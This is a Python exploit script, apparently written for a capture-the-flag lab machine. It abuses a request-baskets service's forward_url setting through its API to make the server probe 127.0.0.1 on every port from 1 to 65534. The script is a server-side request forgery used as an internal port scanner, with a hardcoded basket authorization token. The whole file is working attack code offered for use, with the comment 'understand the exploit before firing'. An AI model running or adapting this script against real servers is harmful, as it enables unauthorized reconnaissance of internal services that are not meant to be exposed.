import requests
#update line number9,13,24,25
#understand the exploit before firing
#exploit explained in youtube video: 

headers1={
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
"Accept": "application/json, text/javascript, */*; q=0.01",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate, br",
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"Authorization": "KejqGK5kvwCQ91RvQEov32IKwk3WjeA7jI2KmimEh6pj",
"X-Requested-With": "XMLHttpRequest",
"Origin": "http://10.10.11.224:55555",
"Connection": "close",
"Referer": "http://10.10.11.224:55555/web/xfnq3md"
}

for port in range(1, 65535):
        data = {
        "forward_url":f"http://127.0.0.1:{port}",
        "proxy_response":True,                                                                                                                                                                                     
        "insecure_tls":False,                                                                                                                                                                                      
        "expand_path":False,                                                                                                                                                                                       
        "capacity":200                                                                                                                                                                                             
        }                                                                                                                                                                                                          
        response1 = requests.put('http://10.10.11.224:55555/api/baskets/xfnq3md', headers=headers1 , json=data)                                                                                                    
        response2 = requests.get('http://10.10.11.224:55555/xfnq3md')                                                                                                                                              
        if "Failed to forward request" in response2.text:                                                                                                                                                          
                print(f"{port}: Port closed")                                                                                                                                                                      
        else:
                print(f"{port}: Port Open")
